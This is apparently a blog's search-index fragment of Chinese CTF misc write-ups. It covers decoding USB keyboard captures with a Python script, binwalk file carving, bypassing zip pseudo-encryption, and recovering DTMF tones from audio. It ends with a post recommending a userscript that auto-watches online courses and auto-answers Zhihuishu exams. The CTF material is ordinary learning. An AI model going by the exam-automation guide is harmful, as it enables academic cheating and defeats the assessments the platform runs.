class="string">&quot;mM&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;nN&quot;</span>, <span class="number">0x12</span>:<span class="string">&quot;oO&quot;</span>, <span class="number">0x13</span>:<span class="string">&quot;pP&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;qQ&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;rR&quot;</span>,</span><br><span class="line">   <span class="number">0x16</span>:<span class="string">&quot;sS&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;tT&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;uU&quot;</span>, <span class="number">0x19</span>:<span class="string">&quot;vV&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;wW&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;xX&quot;</span>,</span><br><span class="line">   <span class="number">0x1C</span>:<span class="string">&quot;yY&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;zZ&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1!&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2@&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3#&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4$&quot;</span>,</span><br><span class="line">   <span class="number">0x22</span>:<span class="string">&quot;5%&quot;</span>, <span class="number">0x23</span>:<span class="string">&quot;6^&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&amp;&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8*&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9(&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0)&quot;</span>,</span><br><span class="line">   <span class="number">0x2C</span>:<span class="string">&quot;  &quot;</span>, <span class="number">0x2D</span>:<span class="string">&quot;-_&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=+&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&#123;&quot;</span>, <span class="number">0x30</span>:<span class="string">&quot;]&#125;&quot;</span>,  <span class="number">0x32</span>:<span class="string">&quot;#~&quot;</span>,</span><br><span class="line">   <span class="number">0x33</span>:<span class="string">&quot;;:&quot;</span>, <span class="number">0x34</span>:<span class="string">&quot;&#x27;\&quot;&quot;</span>,  <span class="number">0x36</span>:<span class="string">&quot;,&lt;&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&gt;&quot;</span>, <span class="number">0x4f</span>:<span class="string">&quot;&gt;&quot;</span>, <span class="number">0x50</span>:<span class="string">&quot;&lt;&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code2chr</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    lines = []</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(filepath,<span class="string">&quot;r&quot;</span>).readlines():</span><br><span class="line">        code = <span class="built_in">int</span>(x[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)   <span class="comment"># 即第三个字节</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># newline or down arrow - move down</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0x51</span> <span class="keyword">or</span> code == <span class="number">0x28</span>:</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># up arrow - move up</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0x52</span>:</span><br><span class="line">            pos -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># select the character based on the Shift key</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(lines) &lt;= pos:</span><br><span class="line">            lines.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">81</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(x[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) == <span class="number">2</span>:</span><br><span class="line">                lines[pos] += usb_codes[code][<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lines[pos] += usb_codes[code][<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:\n\tpython keyboardScanCode.py datafile.txt\nhow to get datafile:\t tshark -r file.usb.pcapng -T fields -e usb.capdata &gt; datafile.txt&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">        code2chr(filepath)</span><br></pre></td></tr></table></figure><p>读取usbdata.txt即可获取flag.<br><img src="/img/u7.png"><br>注意将括号[]转为{}</p><h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 0307xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单misc</title>
      <link href="2020/03/09/%E7%AE%80%E5%8D%95misc/"/>
      <url>2020/03/09/%E7%AE%80%E5%8D%95misc/</url>
      
        <content type="html"><![CDATA[<h1 id="预备知识-kali-linux、binwalk使用、文件头文件尾、base64、摩斯密码"><a href="#预备知识-kali-linux、binwalk使用、文件头文件尾、base64、摩斯密码" class="headerlink" title="预备知识 :kali linux、binwalk使用、文件头文件尾、base64、摩斯密码"></a>预备知识 :kali linux、binwalk使用、文件头文件尾、base64、摩斯密码</h1><p>附件分析：我们拿到一个压缩包，包括了一张图片和一个压缩包。子压缩包中有flag，但是被加密了。</p><h2 id="图片处理"><a href="#图片处理" class="headerlink" title="图片处理"></a>图片处理</h2><p>将图片解压后，我们可以看到图片是裂的，不能看。所以考虑将图片修复。<a href="https://www.cnblogs.com/lwy-kitty/p/3928317.html">常见文件头尾</a><br>使用winhex打开后，发现文件头尾正确。但是文件尾部并不是以FF D9结尾。所以我们考虑可能有额外的文件包含在了这张图片中。</p><h2 id="文件分离"><a href="#文件分离" class="headerlink" title="文件分离"></a>文件分离</h2><p>使用binwalk 工具，可以分析文件结构，将复合文件提取出来。<br>使用方法：binwalk -e filename  eg:binwalk -e photo.jpg<br><img src="/img/ez1.png"><br>分析完后可以发现文本ctf.txt 打开后发现是摩斯密码，使用<a href="https://oktools.net/morse">工具</a>将其解密后为EPIDEMICSITUATIONOFUNIVERSITYWAR<br>由于不是常见的密码形式，于是尝试base64解码。<br>解码后得到EPIDEMICSITUATIONOFUNIVERSITYWAR<br>然后解压附件中的加密文件。<br>解压后，附件flag.txt中的文件内容为VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=<br>看到**=**，考虑base64编码。进行解码。<a href="http://ctf.ssleye.com/base64.html">base64解码工具</a><br>解码后的内容为Th1s_is_FlaG_you_aRE_rigHT<br>即可获得正确flag。</p><h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2><p>这道题相对比较简单 虽然师傅们秒了，我还是花了几分钟才做出来。也可能是运气成分，加上这题比较简单，所以思路比较清晰。<br>这题的关键是文件分离与看得懂编码。<a href="https://blog.csdn.net/lili13897741554/article/details/82177472">base系列编码介绍</a></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 0307xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隐藏的信息</title>
      <link href="2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/"/>
      <url>2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="预备知识：伪加密链接、十六进制文件读取、音频处理、二维码复原"><a href="#预备知识：伪加密链接、十六进制文件读取、音频处理、二维码复原" class="headerlink" title="预备知识：伪加密链接、十六进制文件读取、音频处理、二维码复原"></a>预备知识：伪加密<a href="https://blog.csdn.net/weixin_41687289/article/details/82695801">链接</a>、十六进制文件读取、音频处理、二维码复原</h1><h2 id="附件分析"><a href="#附件分析" class="headerlink" title="附件分析"></a>附件分析</h2><p>1.拿到这道题的文件后，首先看到一张二维码，还有一个有解压密码的压缩包。<br>2.首先对这张二维码进行分析。放入WINHEX(16进制分析工具)后可以发现，在文件的最后隐约有提示”use base64 to get your flag”。暂时不知道什么用，记下来。<img src="/img/jd1.png"><br>3.由于二维码是残缺的，通过PS对二维码的三个定位点复原后可以获得原二维码，然而没有有用的信息。这里不作详细解释。<br>4.接下来我们着手分析这个加密的压缩包。</p><h2 id="加密压缩包处理"><a href="#加密压缩包处理" class="headerlink" title="加密压缩包处理"></a>加密压缩包处理</h2><p>由于压缩包是加密的，首先考虑暴力破解、CRC32碰撞等方式破解密码—-无效。<br>接下来考虑到压缩包可能是伪加密(关于伪加密的详细概念见预备知识中的链接)简单来说就是实际上压缩包是没有加密的，只是出现了表面上加密，让你输入解压密码。<br>破解伪加密的方法：使用winhex软件打开压缩包，将504B0304后的第3、4个字节改为00 00，将504B0102后的第5、6个字节改为00 00即可破解伪加密。<img src="/img/jd2.png"> <img src="/img/jd3.png"><br>之后再解压文件就不会提示输入解压密码了。</p><h2 id="音频文件分析"><a href="#音频文件分析" class="headerlink" title="音频文件分析"></a>音频文件分析</h2><p>使用音频分析软件<strong>Audacity</strong>打开wav文件进行分析。<br>点击软件左方倒三角，模式切换到波形(db)即可发现音频文件的前后都有听不到、但是有分贝的部分。<img src="/img/jd4.png"><br>然后把中间的能听到的部分切掉，将剩下的听不到的部分导出，然后打开AU。<br>打开AU后导入文件，看到音轨是平的，于是我们增加分贝。<img src="/img/jd5.png"><br>统一增加分贝后，由于前面一段的声音太小，于是对前面一段单独增加分贝。<img src="/img/jd6.png"><br>这样就可以听清了。然后打开手机拨号键盘，根据拨号音以及之间的细微差别，可以听出播的号码为187485618521。根据开头图片给的提示，通过base64加密后，即可获得flag.</p><h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2><p>这道题整体来说不难。但是在音频处理的时候很多人想不到拨号音以及放大。在听拨号音的时候其实可以用一些工具，但是对音频分贝的处理以及噪声可能会导致工具识别错误。所以采用用耳朵听的方式。<br>在听的时候先听前五个，自己去拨号模拟一下。前五个比较好确定。<br>然后听最后三个 只有4种特定的键位才能形成最后三个的音调。然后两两确定中间的67 89，多次尝试后即可获得正确的结果。</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 0307xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何科学地看网课(知到)</title>
      <link href="2020/03/06/%E7%A7%91%E5%AD%A6%E7%9C%8B%E7%BD%91%E8%AF%BE/"/>
      <url>2020/03/06/%E7%A7%91%E5%AD%A6%E7%9C%8B%E7%BD%91%E8%AF%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="使用谷歌浏览器安装油猴插件"><a href="#使用谷歌浏览器安装油猴插件" class="headerlink" title="使用谷歌浏览器安装油猴插件"></a>使用谷歌浏览器安装油猴插件</h2><p>从 <a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo">油猴下载链接</a> 获取油猴脚本的插件(需要科学上网)。下载后根据提示，将油猴插件添加至chrome扩展。<br>添加过后就可以在地址栏右侧看到这个图标：<img src="/img/1.png">代表安装成功。<br>无需科学上网的方法：<br>从<a href="https://chrome.zzzmh.cn/info?token=dhdgffkkebhmkfjojejmpbldmpobfkfo">墙内链接</a>获取油猴脚本.CRX文件，然后在浏览器地址栏输入chrome://extensions 添加.crx文件。<br>详细添加教程转自<a href="https://blog.csdn.net/u010520146/article/details/90665446">Chrome安装CRX插件方法</a></p><h2 id="获取看网课脚本"><a href="#获取看网课脚本" class="headerlink" title="获取看网课脚本"></a>获取看网课脚本</h2><p>随后单击该图标，选择获取新脚本。点击第二个”GreasyFork”。进入后搜索”智慧树网课助手”<img src="/img/gf.png">单击进入后，选择安装。<br>安装后是这样：<img src="/img/zhs.png">随后打开网课系统，登陆后点开需要看的网课可自动1.5倍速静音播放。</p><h2 id="自动考试"><a href="#自动考试" class="headerlink" title="自动考试"></a>自动考试</h2><p>该脚本最好的功能(个人认为)是自动考试功能。<br>使用方法：选择章节作业/考试，点进去后脚本会自动搜索题目答案并且自动选择，等所有答案检索完毕后提交即可。<br><img src="/img/cj.png"></p><h3 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h3><p>智慧树平台个人感觉一般。<br>1.登陆时界面不够人性化，而且选择学号登陆时，选择学校，输入完学号密码后按回车登录会跳转到手机号登录。再次选择学号登录才能正常登录。<br>2.成绩分析界面 看课习惯时间轴逆序。做这个图的程序员起夜级李姐 :)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
